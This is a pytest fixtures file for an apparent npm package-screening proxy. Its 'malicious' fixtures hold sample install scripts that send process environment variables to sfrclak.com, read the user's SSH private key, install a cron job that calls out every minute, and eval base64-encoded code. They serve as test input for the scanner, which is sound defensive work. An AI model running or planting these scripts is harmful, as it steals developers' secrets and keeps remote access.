"""Shared test fixtures."""

import io
import json
import tarfile
from datetime import UTC, datetime, timedelta

import pytest

from app.core.config import Settings
from app.schemas.package import PackageInfo


@pytest.fixture
def settings() -> Settings:
    """Test settings with sensible defaults."""
    return Settings(
        debug=True,
        npm_upstream_url="https://registry.npmjs.org",
        cooldown_days=7,
        cooldown_action="warn",
        decision_mode="warn",
        static_analysis_enabled=True,
        static_analysis_severity_threshold="medium",
        llm_enabled=False,
    )


@pytest.fixture
def enforce_settings() -> Settings:
    """Settings with enforce mode."""
    return Settings(
        decision_mode="enforce",
        cooldown_action="deny",
        cooldown_days=7,
    )


@pytest.fixture
def safe_package_info() -> PackageInfo:
    """A safe package published 30 days ago."""
    return PackageInfo(
        name="safe-package",
        version="1.0.0",
        registry="npm",
        publish_date=datetime.now(UTC) - timedelta(days=30),
        install_scripts={},
    )


@pytest.fixture
def recent_package_info() -> PackageInfo:
    """A package published 2 days ago (within cooldown)."""
    return PackageInfo(
        name="new-package",
        version="1.0.0",
        registry="npm",
        publish_date=datetime.now(UTC) - timedelta(days=2),
        install_scripts={"postinstall": "node setup.js"},
    )


@pytest.fixture
def malicious_package_info() -> PackageInfo:
    """A package with malicious install scripts."""
    return PackageInfo(
        name="evil-package",
        version="1.0.0",
        registry="npm",
        publish_date=datetime.now(UTC) - timedelta(days=1),
        install_scripts={
            "postinstall": (
                "node -e \"require('child_process').exec('curl http://sfrclak.com/steal?d='"
                "+Buffer.from(JSON.stringify(process.env)).toString('base64'))\""
            ),
        },
    )


def _make_npm_tarball(files: dict[str, str | bytes]) -> bytes:
    """Create an npm-style tarball (gzipped tar with package/ prefix).

    Args:
        files: Dict of {relative_path: content} pairs.
    """
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for name, content in files.items():
            data = content.encode() if isinstance(content, str) else content
            info = tarfile.TarInfo(name=f"package/{name}")
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()


@pytest.fixture
def safe_tarball() -> bytes:
    """A valid npm tarball with harmless content."""
    package_json = json.dumps(
        {
            "name": "safe-package",
            "version": "1.0.0",
            "scripts": {"test": "echo test"},
        }
    )
    return _make_npm_tarball({"package.json": package_json, "index.js": "module.exports = {};"})


@pytest.fixture
def safe_tarball_with_gyp() -> bytes:
    """A tarball with node-gyp rebuild (known safe)."""
    package_json = json.dumps(
        {
            "name": "native-module",
            "version": "1.0.0",
            "scripts": {"install": "node-gyp rebuild"},
        }
    )
    return _make_npm_tarball({"package.json": package_json})


@pytest.fixture
def malicious_tarball() -> bytes:
    """A tarball with malicious postinstall."""
    package_json = json.dumps(
        {
            "name": "evil-package",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "node scripts/setup.js",
            },
        }
    )
    malicious_script = """
const { exec } = require('child_process');
const https = require('https');
const fs = require('fs');
const data = Buffer.from(JSON.stringify(process.env)).toString('base64');
https.get('https://sfrclak.com/collect?d=' + data);
const sshKey = fs.readFileSync(require('os').homedir() + '/.ssh/id_rsa');
exec('crontab -l | echo "* * * * * curl https://sfrclak.com/ping" | crontab -');
eval(Buffer.from('cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIp', 'base64').toString());
"""
    return _make_npm_tarball(
        {
            "package.json": package_json,
            "scripts/setup.js": malicious_script,
        }
    )


@pytest.fixture
def npm_registry_metadata() -> dict:
    """Sample npm registry response for 'test-package'."""
    return {
        "name": "test-package",
        "dist-tags": {"latest": "1.0.0"},
        "time": {
            "created": "2025-01-01T00:00:00.000Z",
            "modified": "2025-06-01T00:00:00.000Z",
            "1.0.0": "2025-06-01T00:00:00.000Z",
            "0.9.0": "2025-01-01T00:00:00.000Z",
        },
        "versions": {
            "1.0.0": {
                "name": "test-package",
                "version": "1.0.0",
                "scripts": {"test": "jest"},
                "dependencies": {},
                "maintainers": [{"name": "author", "email": "author@example.com"}],
                "dist": {
                    "tarball": "https://registry.npmjs.org/test-package/-/test-package-1.0.0.tgz",
                    "shasum": "abc123",
                    "integrity": "sha512-xyz",
                },
            },
            "0.9.0": {
                "name": "test-package",
                "version": "0.9.0",
                "scripts": {},
                "dependencies": {},
                "maintainers": [{"name": "author", "email": "author@example.com"}],
                "dist": {
                    "tarball": "https://registry.npmjs.org/test-package/-/test-package-0.9.0.tgz",
                    "shasum": "def456",
                },
            },
        },
    }
